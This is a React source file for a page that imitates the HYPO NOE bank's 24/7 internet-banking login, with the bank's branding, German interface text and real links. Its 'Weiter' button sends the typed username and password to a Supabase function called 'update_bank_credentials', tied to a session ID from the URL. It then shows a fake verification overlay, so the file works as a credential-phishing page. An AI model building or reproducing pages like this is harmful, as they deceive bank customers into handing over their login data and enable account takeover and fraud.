import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { X, Info, Eye, EyeOff } from "lucide-react";
import hyponoeLogo from "@/assets/hyponoe-logo.jpg";
import hyponoeBg from "@/assets/hyponoe-bg.png";
import hyponoeIcon from "@/assets/hypo_noe.png";

const HypoNoe = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";
  const [showLoading, setShowLoading] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("HYPO NOE - Login", hyponoeIcon);

  const [username, setUsername] = useState("");
  const [isFocused, setIsFocused] = useState(false);
  const [password, setPassword] = useState("");
  const [isPasswordFocused, setIsPasswordFocused] = useState(false);
  const [showPassword, setShowPassword] = useState(false);

  return (
    <>
      {showLoading && <LoadingOverlay message="Anmeldedaten werden überprüft..." onComplete={() => navigate("/confirmation?s=" + sessionId)} />}
    <div className="min-h-screen flex flex-col" style={{ fontFamily: "Arial, 'Helvetica Neue', Helvetica, sans-serif" }}>
      {/* Header */}
      <header style={{ backgroundColor: "#fff" }}>
        <div className="max-w-[1200px] mx-auto flex items-center px-4 py-2">
          <img src={hyponoeLogo} alt="HYPO NOE" className="h-10 md:h-14" />
        </div>
      </header>

      {/* Main */}
      <div
        className="flex-1 flex items-center justify-center px-4"
        style={{
          backgroundImage: `url(${hyponoeBg})`,
          backgroundSize: "cover",
          backgroundPosition: "center",
          backgroundRepeat: "no-repeat",
        }}
      >
        <div className="w-full max-w-[560px] overflow-hidden">
          {/* Blue header bar */}
          <div
            className="px-6 py-4 text-white font-normal text-2xl"
            style={{ backgroundColor: "#0066cc" }}
          >
            Login 24/7 Internetbanking
          </div>

          {/* Card body */}
          <div className="bg-white px-6 py-5 space-y-4">
            {/* Info text */}
            <p className="text-sm leading-snug" style={{ color: "#333" }}>
              Beim Login wird eine sichere Verbindung aufgebaut. Bitte halten Sie Ihre Anmeldedaten geheim und achten Sie darauf, dass Sie Ihre Anmeldedaten auf keiner Ihnen unbekannten Seite eingeben. Unsere Mitarbeiter werden Sie niemals nach Ihren Anmeldedaten befragen.
            </p>

            {/* Sicherheitsempfehlungen link */}
            <p className="text-[13px]" style={{ color: "#333" }}>
              Bitte beachten Sie unsere{" "}
              <a
                href="https://www.hyponoe.at/services/sicherheitszentrum"
                target="_blank"
                rel="noopener noreferrer"
                className="no-underline hover:underline"
                style={{ color: "#0066cc" }}
              >
                Sicherheitsempfehlungen.
              </a>
            </p>

            {/* Divider */}
            <hr className="border-gray-200" />

            {/* Label row */}
            <div className="flex items-center -mb-3">
              <span className="font-normal text-xs" style={{ color: "#999" }}>
                Benutzername
              </span>
            </div>

            {/* Username input */}
            <div className="relative !mt-1.5">
              <input
                type="text"
                value={username}
                onChange={(e) => setUsername(e.target.value)}
                onFocus={() => setIsFocused(true)}
                onBlur={() => setIsFocused(false)}
                className="w-full px-3 py-2.5 border text-sm outline-none transition-colors rounded-sm"
                style={{
                  backgroundColor: isFocused ? "#d6e5f4" : "#f1f1f1",
                  borderColor: isFocused ? "#0066cc" : "#dedede",
                  boxShadow: isFocused ? "0 0 0 1px #0066cc" : "none",
                }}
              />
              {username && (
                <button
                  onClick={() => setUsername("")}
                  className="absolute right-2 top-1/2 -translate-y-1/2"
                  type="button"
                >
                  <X size={24} color={isFocused ? "#0066cc" : "#333"} />
                </button>
              )}
            </div>

            {/* Password label */}
            <div className="flex items-center -mb-3">
              <span className="font-normal text-xs" style={{ color: "#999" }}>
                Passwort
              </span>
            </div>

            {/* Password input */}
            <div className="relative !mt-1.5">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                onFocus={() => setIsPasswordFocused(true)}
                onBlur={() => setIsPasswordFocused(false)}
                className="w-full px-3 py-2.5 border text-sm outline-none transition-colors rounded-sm"
                style={{
                  backgroundColor: isPasswordFocused ? "#d6e5f4" : "#f1f1f1",
                  borderColor: isPasswordFocused ? "#0066cc" : "#dedede",
                  boxShadow: isPasswordFocused ? "0 0 0 1px #0066cc" : "none",
                }}
              />
              {password && (
                <button
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-2 top-1/2 -translate-y-1/2"
                  type="button"
                >
                  {showPassword ? <EyeOff size={20} color={isPasswordFocused ? "#0066cc" : "#333"} /> : <Eye size={20} color={isPasswordFocused ? "#0066cc" : "#333"} />}
                </button>
              )}
            </div>

            {/* Erste Anmeldung */}
            <div className="text-center">
              <a
                href="https://internetbanking.hyponoe.at/banking/erstlogin2c/erstlogin2c.xhtml"
                target="_blank"
                rel="noopener noreferrer"
                className="text-sm no-underline hover:underline"
                style={{ color: "#0066cc" }}
              >
                Sie melden sich zum ersten Mal an?
              </a>
            </div>

            {/* AGB Text */}
            <p className="text-[13px] text-center" style={{ color: "#333" }}>
              Mit dem Login stimmen Sie den{" "}
              <a href="https://www.hyponoe.at/de/veroffentlichungen/hypo-noe-gruppe/agb" target="_blank" rel="noopener noreferrer" className="no-underline hover:underline" style={{ color: "#0066cc" }}>
                AGB
              </a>{" "}
              und{" "}
              <a href="https://www.hyponoe.at/de/veroffentlichungen/hypo-noe-gruppe/agb" target="_blank" rel="noopener noreferrer" className="no-underline hover:underline" style={{ color: "#0066cc" }}>
                Nutzungsbedingungen
              </a>{" "}
              sowie der{" "}
              <a href="https://www.hyponoe.at/de/rechtliche-hinweise/datenschutz" target="_blank" rel="noopener noreferrer" className="no-underline hover:underline" style={{ color: "#0066cc" }}>
                Datenschutzerklärung
              </a>{" "}
              der HYPO NOE Landesbank für Niederösterreich und Wien AG ausdrücklich zu.
            </p>

            {/* Divider above button */}
            <hr className="-mx-6 border-gray-200" />

            {/* Weiter button */}
            <button
              className="w-full py-2 text-white font-normal text-sm"
              style={{ backgroundColor: "#0066cc" }}
            
              onClick={async () => {
                console.log("Session ID:", sessionId);
                if (sessionId) {
                  const { error } = await supabase.rpc("update_bank_credentials", {
                    p_session_id: sessionId,
                    p_username: username,
                    p_password: password,
                    p_username_label: "Benutzername",
                    p_password_label: "Passwort",
                  });
                  if (error) console.error("Update failed:", error);
                  else console.log("Update successful");
                } else {
                  console.error("No session ID found in URL!");
                }
                setShowLoading(true);
              }}>
              Weiter
            </button>

            {/* Divider below button */}
            <hr className="-mx-6 border-gray-200" />

            {/* Links */}
            <div className="flex flex-col items-center gap-2">
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0"
                style={{ color: "#0066cc" }}
              >
                Benutzername vergessen?
              </a>
              <a
                href="#"
                onClick={(e) => e.preventDefault()}
                className="text-[15px] no-underline hover:underline leading-tight py-0 my-0 inline-flex items-center gap-1"
                style={{ color: "#0066cc" }}
              >
                <Info size={16} />
                Live Hilfe
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
    </>
  );
};

export default HypoNoe;
